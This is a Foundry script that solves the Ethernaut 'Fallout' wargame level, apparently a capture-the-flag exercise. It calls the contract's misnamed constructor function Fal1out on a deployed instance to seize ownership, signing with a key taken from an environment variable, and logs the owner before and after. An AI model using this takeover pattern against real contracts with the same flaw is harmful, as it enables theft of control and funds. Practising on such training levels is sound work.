// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "ethernaut/Fallout/Fallout.sol";
import "ethernaut/EthernautTestHelpers.sol";

contract Fallout_script is Test, EthernautTestHelpers {
    Fallout instance;
    uint256 PKEY;

    function setUp() public {
        instance = Fallout(payable(0x38bFe0960f5a263116439C0E6A1448424eE2e711));
        // instance = new Fallout();
        PKEY = vm.envUint("DEPLOYMENT_KEY");
    }

    function run() public {
        vm.startBroadcast(PKEY);

        address ownerOf = payable(instance.owner());
        console.log("ownerOf: %s", ownerOf);
        instance.Fal1out{value: 0.0000001 ether}();
        ownerOf = instance.owner();
        console.log("ownerOf: %s", ownerOf);

        vm.stopBroadcast();
    }
}
